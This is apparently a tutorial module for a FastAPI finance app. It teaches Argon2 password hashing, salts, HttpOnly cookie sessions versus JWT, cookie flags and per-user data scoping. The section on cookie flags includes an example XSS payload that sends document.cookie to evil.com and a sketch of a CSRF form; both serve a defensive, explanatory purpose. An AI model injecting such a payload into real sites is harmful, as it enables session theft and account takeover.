# Module 7 — Authentication

Pynance has been a **single-user** app — one person's budget on one machine,
no login. This module adds **real user accounts**: signup, login, logout,
per-user data. It turns "a tool I run for myself" into "an app other people
can use."

This is the biggest *security* topic in the project. The session mechanism
was chosen deliberately (recorded in ADR 0005): **HttpOnly-cookie server-side
sessions**, not JWT. This file explains *why* and covers the concepts needed
to build it.

This file is self-contained: read it, then do the exercise at the bottom.

**Reference project.** The FastAPI idioms here (Argon2 hashing via `pwdlib`,
the `CurrentUser` annotated dependency, scoping on write, case-insensitive
login, "incorrect email or password") come from the FastAPI tutorial at
`/home/mrbeaver/dev/fastapi-tutorial-by-corey-schafer`. Its `auth.py`,
`models.py`, and `routers/users.py` + `routers/posts.py` provide a concrete,
idiomatic reference implementation. One deliberate divergence: that tutorial
uses **JWT Bearer tokens** and treats posts as *publicly readable* (a blog),
so its auth is shaped for that. Pynance holds private finance data, so it
keeps **cookie sessions** (below) and makes every protected resource
*private*. Reuse its structure, not its token mechanism.

---

## First: the two things "auth" is made of

People conflate two separate problems when they say "authentication":

1. **Verifying who you are** — the server checks your password (or whatever
   credential) and decides "yes, you are this user."
2. **Remembering you're logged in** — after login, how does the browser keep
   proving your identity on every *subsequent* request without re-typing the
   password?

Both are needed. The JWT-vs-sessions debate is entirely about **#2**. Password
hashing (part of #1) is needed either way — you never store plaintext
passwords.

## Part 1: passwords must be hashed

**The problem.** Never store a plaintext password. If your database leaks
(even a read-only copy from a bad backup), every user's password is
compromised — and people reuse passwords across sites, so a leak in one
place cascades to their email, bank, etc. So the DB must hold something that
is *not* the password, but can still be used to check a login.

### First: what a hash *is* (a toy example)

A hash is just a **function**. You give it input, it gives you output. The
two properties that matter:

1. **Deterministic** — the same input always gives the same output.
2. **One-way** — you can't go from the output back to the input.

Imagine a made-up hash that simply counts the letters:

```
hash("password") = "8"     (8 letters)    -- always "8"
hash("hello")    = "5"                    -- always "5"
hash("pizza")    = "5"                    -- same output as "hello"! (collision)
```

That's a *bad* hash (collisions), but it shows the idea: it's a machine
that maps any input to a fixed-size output, deterministically.

**"One-way" is the crucial bit.** Nothing in the output tells you the
input. If the DB says `"8"`, you cannot know whether the password was
"password", "computer", or "elephant". The only way to find out is to
**guess inputs and run the function**, and see if a guess produces `"8"`.

### "Can't the attacker steal the function and run it on all passwords?" — no, the function isn't the secret

A hash function (SHA-256, Argon2) is *public*. Security doesn't come from
hiding the function (that's "security by obscurity" and not the model used
here). What an attacker has after a database leak is **the list of stored
hashes** — one per user. The function itself is already known.

The attack is a **dictionary / brute-force attack**:

```
attacker has:  hash("password")  hash("computer")  hash("elephant")   <- the leak
attacker knows: the function
attacker's plan: try candidate passwords, run the function, see if any matches
                a stored hash.
```

It *works* — the only question is **how fast** the attacker can try
candidates. This is the single most important property to understand.

### "Slow" explained with numbers

Consider an attacker with a **list of the 1 million most common passwords**
(a "dictionary"), trying each against every user's hash. Two scenarios:

**Scenario A — the password hash uses a *fast* function (like SHA-256).**

SHA-256 runs at roughly **10 billion hashes per second** on a single machine
(and GPUs go much faster). Trying 1 million candidates:

```
1,000,000 / 10,000,000,000 = 0.0001 seconds
```

A tenth of a millisecond to check the entire common-password dictionary.
Realistic passwords are almost all in that list, so most accounts fall in
**minutes**. Fast functions are exactly what an attacker wants.

**Scenario B — the password hash uses a *deliberately slow* algorithm (Argon2).**

Argon2 is tuned to take ~0.5 *seconds* per hash. Trying the same 1 million:

```
1,000,000 × 0.5s = 500,000 seconds ≈ 5.8 days
```

And that's *just* the dictionary, not the millions of random guesses after.
"Slow by design" means: **the function itself is made expensive on purpose,**
so that even a legitimate check (once per login) is fine, but doing it a
million times is brutally expensive.

**This is why hash speed is the enemy.** A fast hash makes the attacker's
one job (guess-and-check) cheap. A slow hash makes guess-and-check ruinously
costly. The fraction of a second spent logging in is nothing; the hundreds
of thousands of seconds the attacker spends is everything.

So: **the attacker *can* run the function on all passwords — the defense is
making doing so too slow to be worth it.** Speed is the security, not
secrecy.

### What a salt is (and why it matters)

Here's a subtle problem: if two users have the same password, and you hash it
the same way, they get the **same hash**. That lets an attacker:

1. Spot users with identical passwords (a big red flag that they reused one).
2. Use a **precomputed table** (rainbow tables, or "hashes of all common
   passwords") and just look up matches — no brute-forcing needed for the
   most common passwords.

Let's make #2 concrete. Without salt, an attacker can precompute, *in
advance*, the hashes of every common password:

```
precomputed table (built once, offline):
  hash("password")   = "a1ba..."
  hash("123456")     = "0de9..."
  hash("qwerty")     = "30f2..."
  ... (a million entries)
```

Then when the DB leaks, they don't compute anything — they just **look up**
each stored hash in the table:

```
leaked row:  "a1ba..."    → table says "a1ba..." = "password"   → GOT IT, instantly
```

One table serves *every* user and *every* site that used the same password.
This is why `slow` alone isn't enough — speed doesn't matter if the attacker
did the work once, ahead of time.

**The salt breaks this.** A salt is a random value mixed into the hash, unique
per password:

```
user A:  password="password",  salt="s_7K2q"  →  hash("s_7K2q" + "password") = "9f14..."
user B:  password="password",  salt="m_9wX1"  →  hash("m_9wX1" + "password") = "c3a0..."
```

Two consequences:

1. **Same password → different stored hashes.** The duplicate is gone; two
   users sharing a password can no longer be spotted.
2. **The precomputed table is now useless.** The attacker would have had to
   precompute `hash(salt + password)` for *every possible salt*, which is
   impossible (there are astronomically many salts). So they're back to
   brute-forcing *per user* — and that's where `slow` bites again.

### But wait — isn't the salt visible to the attacker too?

Yes. **The salt is not a secret, and it doesn't need to be.** An attacker who
leaks the DB reads the salt from the hash string just like you can. But that
doesn't help them, because of what the salt actually does.

The salt is not a "hidden key" that keeps the password safe. Its only job is
to make each hash unique and to break precomputed tables. Walk through it:

```
attacker's precomputed table contains:  hash("password") = "a1ba..."
the leaked row has:  salt="s_7K2q",  result = "9f14..."   (= hash("s_7K2q"+"password"))
```

The attacker knows `salt="s_7K2q"`. But their table has
`hash("password")`, **not** `hash("s_7K2q"+"password")`. So the table doesn't
match. To attack this specific user they'd have to brute-force `password`
not knowing the salt beforehand — which is exactly the slow, expensive path.

The salt's value is **not secrecy; it's uniqueness per user.** It forces the
attacker to redo the work for every single user (no shared precomputed work),
and then `slow` makes that per-user work ruinously expensive. Salt and slow
are a pair: salt removes the shortcut, slow makes the remaining path
prohibitively costly.

### The password vs the salt

One asymmetry worth state clearly:

- The **password** is the hidden secret the attacker must guess.
- The **salt** is public. It doesn't hide anything; it only prevents the
  attacker from reusing precomputed work.

So a leak reveals the salt and the hash — but *not* the password, and it
gives no shortcut to find it. The attacker is left with brute-force, one
slow hash at a time, per user. A strong password (large search space) makes
even that hopeless.

**`slow` and `salt` work together**: `salt` stops the attacker from sharing
work across users (kills precomputed tables), and `slow` makes the work they
*do* have to do (brute-force per user) ruinously expensive. Both are needed.

### Where the salt is stored (the elegant part)

This raises an obvious question: **if the salt is random, how does the system
remember which salt it used when it hashes your password later, at login?**

The answer: **the salt lives inside the hash string itself.** It's not stored
in a separate column. Libraries like `pwdlib`/Argon2 and bcrypt package
everything the verifier needs — the algorithm, the cost parameters, the
salt, and the digest — into a single, self-describing string.

A real Argon2 hash looks like this:

```
$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$+2rT0a...
└─┬───┘  └─┬┘ └──┬──┘ └──┬──┘  └───┬──┘  └──┬──┘
algorithm  version  cost   cost    salt    actual
(Argon2id)          params  (base64)  digest
```

Breaking down the fields:

- `$argon2id$` — the algorithm.
- `v=19` — the version.
- `m=65536,t=3,p=4` — the **cost parameters** (memory, time, parallelism).
  These are the "slow by design" knobs.
- `c29tZXNhbHQ` — the **arbitrary salt**, base64-encoded. In this example,
  `c29tZXNhbHQ` decodes to the ASCII string `"somesalt"`.
- `+2rT0a...` — the actual **digest** (the hash output).

Because the salt is baked into the string, **verification needs nothing
extra**. At login the system:

1. Reads the stored string, **extracts the salt and cost parameters** from it.
2. Recomputes the hash using *that exact salt* and *those exact parameters*.
3. Compares the result to the digest stored in the string.

So the salt "remembers itself" — it travels with the hash it was used to
produce. That's what "self-describing" means: the string contains everything
needed to verify a password, with no separate bookkeeping. This is why the
library can just take the stored string and the plaintext password and tell
you yes/no — it does the extraction and recomputation for you.

### The right tools

Use a library, never roll your own. In Python, the modern choice is
`pwdlib` (or `argon2-cffi` / `bcrypt` directly). The pattern:

```python
from pwdlib import PasswordHash

password_hash = PasswordHash.recommended()  # Argon2 with sane defaults

hashed = password_hash.hash("my password")  # signup: store `hashed`
ok = password_hash.verify("my password", hashed)  # login: True/False
```

The library handles the security-critical parts; these must **not** be
reimplemented by hand:

- Generates a unique salt per hash.
- Stores salt + algorithm + cost params in the hash string (self-describing).
- Uses a **timing-safe comparison** — compares hash bytes in constant time so
  an attacker can't measure *how* wrong the password was via response timing.
  (Comparing with `==` leaks a timing side channel.)

### Rules to live by

- **Signup:** hash the password, store only the hash.
- **Login:** take the incoming password, verify against the stored hash.
- **Never log, print, or store the plaintext password** — not even temporarily
  in a log line or an exception message.
- **Never weaken the cost** to make it "faster" — that reintroduces the
  brute-force problem.
- **Never think "I'll hash with SHA-256"** — that's for integrity, not
  passwords. Password hashing is a different category of algorithm.

## Part 2: remembering you're logged in (sessions, the chosen way)

After login, the server needs to recognize you. This part gets confusing
because it's about **the browser's memory**, not the server's. Let's first
understand the problem with a toy example.

### The problem: the browser forgets everything between requests

HTTP is **stateless**. Each request is independent — the server has no idea
that the last request was "from the same person". Think of it like a stranger
knocking on a door every time:

```
Request 1:  "Hi, I'm Alice, here's my password."   → server: "ok, logged in!"
Request 2:  "Hi, I want my transactions."            → server: "Who are you?"
```

After Request 1 the server *forgot* you existed. So the browser needs a way
to say "it's me, Alice again" on every single request. That's what the
**session token** is for.

### The flow, step by step (the "sticky note" model)

The simplest mental model: the session token is like a **numbered coat-check
ticket**.

1. **Login** — you give the server your password. It checks (recompute + compare
   hash, from Part 1). If correct, it does two things:
   - **Writes a row in a `sessions` table**: a random long token ({`a1b2…`},
     the "ticket number"), your user id, and an expiry.
   - **Gives you the ticket** — sends the token to your browser as a **cookie**.

   Cookie is a tiny piece of data the browser stores and **automatically
   sends back on every request to that site**. You never type it; the browser
   handles it.

2. **Every request** — the browser sends the cookie (the ticket) along. The
   server reads the ticket, looks it up in the `sessions` table, finds your
   user id, and knows who you are. No password needed again.

3. **Logout** — the server **deletes the row** in `sessions`. The ticket no
   longer exists → the next request with that cookie is rejected. The
   session is dead *immediately*.

The key idea: **the ticket is only valid because it's in the server's list.**
The server has the real record; the cookie is just a pointer to it.

### What a cookie actually is (a toy example)

A cookie is just `name=value` the browser remembers for a site:

```
Cookie: session_token=a1b2c3...
```

Set by the server on login (via an HTTP header, `Set-Cookie`). The browser
stores it and, from then on, attaches it to every request to that site.

```
You login      → server: "Set-Cookie: session_token=a1b2..." 
Next request   → browser: "Cookie: session_token=a1b2..."   (automatic)
```

That's it. It's a sticky note the browser keeps and re-sends for you.

### The flags on the cookie (explained one by one)

The cookie has attributes that control how it behaves and how safe it is.
There are four that matter for a session cookie. Each has a specific job —
and each has a concrete attack it defends against, which is the best way to
understand it. For each flag: what it does, what relies on it, and what
happens if you leave it off.

**`HttpOnly`** — *"JavaScript cannot read this cookie."*

The browser runs your frontend's JavaScript. If that JS could read the
cookie, then any bug that lets an attacker run their own script in your page
(called **XSS**, cross-site scripting) could **steal your session token** by
reading `document.cookie` and send it to the attacker's server. `HttpOnly`
marks the cookie as HTTP-only: JavaScript is never given access to it. Only
the browser's HTTP layer sends it.

- **Why it matters**: it turns an XSS hole from "attacker takes over my
  account" into "attacker can mess with the page, but can't get my session."
- **Without it**: one XSS bug anywhere in the frontend → session cookie is
  readable → full account takeover. This is the single highest-impact flag.

A typical XSS flow:

```
1. Attacker finds a place where user input is rendered as HTML (e.g. a comment).
2. Attacker posts:  <script>fetch('https://evil.com?c='+document.cookie)</script>
3. A victim loads the page → the script runs → reads document.cookie.
4. If the cookie were NOT HttpOnly → the token is exfiltrated → attacker is you.
   If it IS HttpOnly → document.cookie returns nothing → the token is safe.
```

**`Secure`** — *"only send this cookie over HTTPS."*

If the cookie were also sent over plain HTTP, anyone able to watch the
network traffic could read it. That includes a public Wi-Fi you don't
control, an ISP, or anyone on the same network. `Secure` tells the browser:
never send this cookie over an insecure (HTTP) connection.

- **Why it matters**: HTTPS encrypts the whole request, so the cookie is
  wrapped in that encryption. `Secure` guarantees the token only ever travels
  encrypted.
- **Without it**: on a public Wi-Fi, `session_token` shows up in plaintext in
  the traffic — every device on the network could read it and hijack the
  session.
- **Note**: in local development (`http://localhost`) browsers often relax
  this so the cookie still works, since localhost is treated as trusted. In
  production it *must* be set, and it's one reason the "to prod" module
  delivers HTTPS.

**`SameSite=Lax`** — *"only send this cookie for same-site requests."*

This defends against **CSRF** (cross-site request forgery). CSRF is an
attack where a malicious page tricks *your* browser into sending a request to
a site you're already logged into, riding on your session. Since the browser
*automatically* attaches the session cookie, a well-crafted link or form on a
malicious site could make you do something — post a transfer, change an
email — without you knowing.

- **Why it matters**: `SameSite=Lax` means the cookie is *not* sent with
  cross-site requests (a request that originates from a different site). So
  a malicious page can't carry your auth with it.
- **Without it**: a hidden form on `evil.com` auto-submitting
  `POST /transfers` would include your session cookie → the action happens as
  you.

A CSRF flow:

```
1. You're logged into pynance (session cookie saved).
2. You visit evil.com, which contains a hidden form:
     <form action="/transfers" method="POST"> ... </form> that auto-submits.
3. The browser sends that POST *with your session cookie* (because SameSite=Lax
   is absent, or the request is "same-site enough").
4. The server can't tell it's from evil.com → it processes the transfer.
```

**`Max-Age`** — *"this cookie expires in X seconds."*

Even a "perfect" cookie should not live forever. `Max-Age` (or `Expires`)
sets a lifetime that should match the session's expiry. Bound every token so
that, even if it's stolen, it's only usable for a limited window.

- **Why it matters**: it's the last line of defense — if a token leaks, the
  damage is time-boxed.
- **Without it**: a session cookie is usually a session cookie that dies when
  the browser closes, *or* can be set to persist indefinitely. A stolen token
  from a forgotten cookie works forever, and sessions pile up in the DB
  without ever expiring.

**Putting them together** — these four flags are not optional extras; they are
what make a cookie session safe. The HTTP header that sets a session cookie
typically looks like this:

```
Set-Cookie: session_token=a1b2c3...; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
           └──the value──┘ └─1──┘ └─2─┘ └────3────┘ └─────4──────┘
```

### Why this beats JWT (for us) — recap

The alternative — JWT — stores the token somewhere the browser keeps,
typically `localStorage`, which **JavaScript can read**. So the `HttpOnly`
protection is lost: an XSS hole can steal a JWT just as easily, and sometimes
more easily, because the app's own code explicitly reads it from storage on
every request. And a JWT has **no server-side record**: you cannot revoke it.
Once issued, it works until it expires, unless you maintain a separate
blacklist (which reintroduces the server-side state you were trying to avoid).

For private finance data, the two things that matter most:

| Concern | Cookie session (chosen) | JWT |
|---|---|---|
| **XSS can steal the token?** | No — `HttpOnly` hides it from JS | Yes — it's in `localStorage`, JS reads it |
| **Logout/revoke is instant?** | Yes — delete the session row, dead now | No — valid until expiry (or blacklist) |
| **Server-side state** | Yes (a DB row per session) | No (stateless) |
| **Scales to many servers** | No (stateful) | Yes (stateless) |

The main advantage of JWT is that it works on any number of servers without
sharing state. For an application that needs to run across many server
instances (horizontal scaling), that is valuable. Pynance is not such an
application: it is a small, single-instance service, and that remains true
even in a public production deployment. A single server (or a single
container) does not need stateless tokens, so this advantage does not apply.

The disadvantages of JWT, on the other hand, are serious:

- **You cannot revoke a token.** Once issued, it stays valid until it
  expires. The only way to stop it early is to keep a blacklist — which
  means storing server-side state anyway, defeating the point.
- **The token is readable by JavaScript.** It lives in `localStorage`, which
  any script on the page can read, so an XSS bug can steal it.

Those two problems are exactly the kind a finance app must avoid. So the
cookie-session approach — where tokens can be revoked instantly and are
hidden from JavaScript — is the safer trade-off here, even though it does a
database lookup per request.

### One thing that makes this easy in Pynance

Cookies and CSRF get much trickier when the frontend and backend live on
*different origins* (different domain OR different port — the browser treats
both as "different site"). Cross-origin means:
- the cookie must be configured with `SameSite=None; Secure` and the backend
  must send CORS headers with `credentials: true`;
- the frontend fetch calls must set `credentials: 'include'`;
- CSRF protection becomes a real concern.

In Pynance the frontend and backend are **same-origin**, so none of that is
needed:

- **Development**: the Vite dev server proxies `/api/*` to the backend on
  port 8000. From the browser's perspective, everything it talks to is on
  `http://localhost:5173` — one origin. The cookie just works, with no
  cross-site config.
- **Production**: FastAPI serves the built frontend (from `frontend/dist/`),
  so the frontend and the API are served by the same process — one origin,
  one port.

```text
dev:    browser ──> localhost:5173 ──(proxy)──> localhost:8000   (one origin to browser)
prod:   browser ──> single FastAPI server (static frontend + /api)   (one origin, one port)
```

This is also why the project avoids CORS middleware by default (AGENTS.md):
CORS is only needed when two origins must talk. With a single origin, the
cookie flows naturally, and CSRF is mitigated by `SameSite=Lax` without
extra plumbing. If the app ever moves to a separate frontend domain, this is
the section to revisit — but as designed, it's a non-issue.

## The data model

A `User` table, plus the per-entity ownership:

```
User
├── id
├── email             (unique)
├── password_hash
└── created_at

Session
├── id
├── user_id           (FK → users)
├── token             (unique, random)
├── created_at
└── expires_at
```

**Every existing entity gains `user_id`** (FK → users): transactions,
categories, assets, transfers, recurring templates. This is the per-user
ownership we deliberately deferred earlier (the "keep an eye toward
`owner_id`" note). The schema change is additive: add the column + a
migration that backfills existing rows to the (single) existing user, then
make it NOT NULL.

## The auth API routes

```
POST /auth/register     { email, password }  -> 201, creates user
POST /auth/login        { email, password }  -> 200, sets cookie
POST /auth/logout                            -> 204, clears cookie + deletes session
GET  /auth/me                                -> 200, the logged-in user
```

Plus the pattern that changes *all* existing routes: **a dependency that
resolves the current user** from the cookie/session. Every protected route
uses it. The service functions then receive the `user_id` (or user) so they
scope queries to that user only.

## Scoping: the big refactor

This is the real work of the module. Every existing service function must be
**scoped to the user**:

```python
# before: list_transactions(db, filters) -> all transactions
# after:  list_transactions(db, user, filters) -> transactions WHERE user_id = user.id
```

Every query gets a `WHERE user_id = ...`. Every create sets `user_id`.
Every get/update/delete checks the row belongs to the user (else 404 — don't
leak that another user's row exists).

## Pitfalls

- **Storing a plaintext password** — never. Hash with Argon2/bcrypt.
- **Logging or printing passwords/tokens** — never; `SecretStr` for settings,
  and the password comes into the schema as a field you only use to hash.
- **Not scoping queries** — forgetting `WHERE user_id = ...` is the classic
  auth bug: user A sees user B's data. Every query must be scoped.
- **Telling a user a row exists but isn't theirs** — return 404, not 403, so
  you don't reveal other users' data. The reference project returns 403
  ("Not authorized") here, which is more explicit — but it confirms the row
  exists, which leaks information. For private finance data, treating "not
  yours" as "doesn't exist" (404) is the safer choice. This is a deliberate
  divergence from the tutorial.
- **Cookie without `HttpOnly`/`SameSite`** — defeats the security benefit.
- **Comparing passwords with `==`** — a timing-side-channel; use the library's
  verify (it's timing-safe).
- **Expired sessions not cleaned up** — the session stays in the table; add a
  check on lookup (or a cleanup job later).

## Relationship to OAuth / OpenID Connect

This module builds **first-party authentication** ("authN"): a user registers
and logs in against our own database, and we manage our own session. That is
distinct from **OAuth 2.0** and **OpenID Connect (OIDC)**, which solve a
different problem. It's worth keeping the two apart, because the same word
"authentication" is used for both.

Two abbreviations to fix the terminology:

- **authN (authentication)** — "who are you?" Verifying identity. This is what
  this module builds (login + session).
- **authZ (authorization)** — "what may you do?" Deciding permissions. In
  Pynance this is the per-user scoping (`user_id`).

**OAuth 2.0** is a **delegation protocol**: "let this third-party app access
*my* data on another service, without giving it my password." A service
issues a limited, revocable **token**. It does not, by itself, authenticate a
user — it only delegates access.

**OpenID Connect (OIDC)** is OAuth *plus* an identity layer: it tells the
client *who* the user is. That is why "Sign in with Google" looks like a
login — technically it is OIDC, not plain OAuth and not a first-party login.

Concrete scenarios:

| Scenario | What happens | Is it OAuth? |
|---|---|---|
| **Login in our site** | User logs in with email + password against our DB; we set our session cookie | **No** — first-party authN (this module) |
| **"Sign in with Google"** | A third party (Google) tells us "this is Alice" | **Yes, OIDC** (OAuth + identity) |
| **App reading bank data** | An app requests access; the bank issues a limited token | **Yes, OAuth 2.0** |

For Pynance, this module covers only the first row. OAuth/OIDC would become
relevant later, in two places:

- **"Sign in with Google"** (via OIDC) — plausible if the app is opened to
  friends and you want to avoid managing passwords.
- **Linking external accounts**, or the Telegram bot in multi-user mode, or
  reading data from another API — all OAuth territory.

Conceptual order to internalize: **authN** (who) → **authZ** (permissions) →
then, separately, **OAuth/OIDC** (delegation to third parties). OAuth does not
replace first-party login; it is a different layer that can *augment* it.

This module's migration is a good example of the **back-before-destructive-migration**
practice: it adds a NOT NULL `user_id` to tables that already hold rows, and
backfills them to a seed user. The database wiki (`02-persistence.md`,
"Back up before a destructive-risk migration") describes the practice and the
`pg_dump`/`psql` commands; it was applied here before running the migration.

---

## What to do on your own (the exercise)

Follow the project conventions (facade `__init__` + `__all__`, one file per
entity, thin routers, services hold the logic). The steps build on each
other, so do them in order and re-run the tooling after each.

### Step 1 — Models (largely done)

`models/user.py` (already reviewed) and `models/session.py` exist, and all
five entities have `user_id`. Check these before moving on:

- The facade `models/__init__.py` must `import` + `__all__` `User` and
  `Session`. Without it, Alembic won't see the tables (the recurring cause of
  "the migration generated nothing").
- `Session.token` should be **unique**. A session token is only useful if it
  maps to exactly one session; make it `unique=True`.
- The `user_id` FK on every entity must be `nullable=False` (it is).

This step is essentially complete. If you want, add the `user_id` FK to the
migration review (it's already applied on your dev DB).

### Step 2 — Password helpers (`services/security.py`)

Create `services/security.py`. Two functions, using `pwdlib` (Argon2):

```python
from pwdlib import PasswordHash

password_hash = PasswordHash.recommended()

def hash_password(password: str) -> str:
    return password_hash.hash(password)

def verify_password(plain: str, hashed: str) -> bool:
    return password_hash.verify(plain, hashed)
```

Rules: never import this into a model (models stay dumb); never accept a
plaintext password into a `create` schema and store it directly — always run
`hash_password` first. `pwdlib.verify` is timing-safe (do **not** compare
hashes with `==`).

### Step 3 — Auth service (`services/auth.py`)

Four functions. They follow the same shape as the other services (take a
`db: Session`, raise domain exceptions from `services/exceptions.py`).

```python
def register_user(db: Session, data: UserCreate) -> User
def login_user(db: Session, data: UserLogin) -> Session   # returns the session
def logout_user(db: Session, token: str) -> None
def get_user_by_token(db: Session, token: str) -> User | None
```

Details:

- **register**: check the email is unique (case-insensitive, like the
  reference project — `func.lower(User.email)`), raise a domain exception
  (→ 409) if taken; hash the password; create the `User`.
- **login**: find the user by email (case-insensitive); if not found or
  `verify_password` fails, raise one generic domain exception (→ 401) with
  the same message ("Incorrect email or password") so you don't reveal which
  was wrong; on success, create a `Session`:
  ```python
  token = secrets.token_urlsafe(32)          # unguessable
  expires_at = datetime.now(UTC) + timedelta(days=30)
  ```
  Store the `Session` row and return it.
- **logout**: delete the `Session` row for the given token.
- **get_user_by_token**: look up the `Session` by token; check it's not
  expired; return the `User` (or `None`).

Add these to `services/exceptions.py`: `EmailAlreadyRegisteredError`,
`InvalidCredentialsError`, `SessionNotFoundError`/`InvalidSessionError`.

### Step 4 — Schemas (`schemas/auth.py`)

Follow the `Base`/`Create`/`Response` pattern from `schemas/category.py`:

```python
class UserCreate(BaseModel):
    email: EmailStr          # pydantic[email] for validation
    password: str            # comes in, is hashed, never stored raw

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class UserResponse(BaseModel):
    id: int
    email: str
    created_at: datetime
    model_config = ConfigDict(from_attributes=True)

class TokenResponse(BaseModel):
    token: str
    token_type: str = "bearer"
```

### Step 5 — `get_current_user` dependency

This is the gate that everything protected will use. Put it in a small
`api/dependencies.py`. Because the decision (ADR 0005) is an **HttpOnly
cookie**, the dependency reads the token from the request's cookie — not from
an `Authorization` header.

In FastAPI you get the cookie from the `Request` object. The idiom is an
`Annotated` alias (like the reference project's `CurrentUser`), so every
protected route can just declare `current_user: CurrentUser`:

```python
from typing import Annotated
from fastapi import Depends, HTTPException, Request, status
from sqlalchemy.orm import Session

from pynance.database import get_db
from pynance.models.user import User
from pynance.services import auth as auth_service

SESSION_COOKIE_NAME = "session_token"

def get_current_user(
    request: Request,
    db: Annotated[Session, Depends(get_db)],
) -> User:
    token = request.cookies.get(SESSION_COOKIE_NAME)
    user = auth_service.get_user_by_token(db, token) if token else None
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired session",
        )
    return user

CurrentUser = Annotated[User, Depends(get_current_user)]
```

Key points:

- The cookie name (`session_token`) must match the one set on login — define
  it once as a constant and reuse it in both the router (setting/clearing the
  cookie) and this dependency (reading it).
- `get_user_by_token` already returns `None` for a missing or expired session,
  so the dependency just maps that to a 401.
- The `Annotated[User, Depends(...)]` alias is what makes protected routes
  terse: `def list_transactions(user: CurrentUser, db: ...)`.
- The reference project uses `HTTPBearer` (reading the `Authorization`
  header) — that is *its* choice; this project deliberately diverges (see
  ADR 0005). Don't copy the bearer approach here.

### Step 6 — Auth router (`api/routers/auth.py`)

Wire the four routes, registering the router in `api/main.py`:

```python
@router.post("/register", response_model=UserResponse, status_code=201)
@router.post("/login", response_model=TokenResponse)      # sets the cookie
@router.post("/logout", status_code=204)                  # clears the cookie + deletes session
@router.get("/me", response_model=UserResponse)           # returns the logged-in user
```

Each handler: call the service, translate domain exceptions to HTTP codes
(409 for duplicate email, 401 for bad credentials), and set/clear the cookie
on login/logout.

### Step 7 — Scope every existing service

The big refactor. Every service function gains a `user_id` (or `user`) and
filters by it. Follow the NAMING: pass the user id down, and scope each query:

```python
# before
def list_transactions(db, filters):       # -> all transactions
# after
def list_transactions(db, user, filters): # -> WHERE user_id = user.id
```

Apply consistently to every `services/*.py`: `create_*` sets `user_id`;
`list_*`/`get_*` filter by it; `update_*`/`delete_*` look up *and* check
ownership (return 404, not 403, if the row isn't the caller's — see
Pitfalls). Then update the routers and tests to thread `user` through.

### Step 8 — Tests (`tests/test_auth.py`)

Test through the HTTP layer (like the other modules). Cover:

- register → 201, then `/me` with the cookie → 200
- login wrong password → 401 (and the message doesn't reveal which field)
- duplicate email → 409
- logout → 204, then `/me` → 401
- **unauthenticated request → 401**
- **user A cannot read/modify user B's data** (the key ownership test: create
  two users, try to access the other's row → 404)

The test DB uses `create_all`, so `User`/`Session` tables appear automatically
once `models/__init__.py` imports them. Add `delete(Session)`, `delete(User)`
to the `db_session` teardown in `tests/conftest.py` (in FK order: sessions
before users, and before all the entities that reference users).

### Tooling checkpoints

Run after each step: `uv run ruff check .`, `uv run ruff format --check .`,
`uv run mypy .`, `uv run pytest`. Each step should leave the suite green.

Send me your code when done. The "to prod" module (Docker, HTTPS, secrets)
builds directly on this — secure cookies require HTTPS, which that module
delivers.
